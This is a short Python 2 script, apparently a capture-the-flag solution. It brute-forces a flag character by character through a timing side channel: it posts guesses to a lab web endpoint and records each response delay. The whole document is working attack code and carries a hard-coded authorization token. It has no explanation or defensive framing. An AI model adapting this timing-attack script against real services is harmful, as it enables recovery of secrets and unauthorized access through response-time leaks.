import requests
import json
dic="abcdefghijklmnopqrstuvwxyz"

previous_delay=5

flag="sp4rk{TBAarethe"
for i in dic :

	trial_flag = flag + i
	print "trying : " + trial_flag
	token={'authorization':'LinUxUqisYo2COolAhd7qfaUzuOHTEemkzCB1STEk'}
	url = 'http://192.168.1.201:3000/project/delay'
	data={}
	data['flag']=trial_flag
	r=requests.post(url,data,headers=token )
	delay = r.elapsed.total_seconds()


	r=json.loads(r.text)

	print str(r['success']) +" " + trial_flag + " "+ str(delay)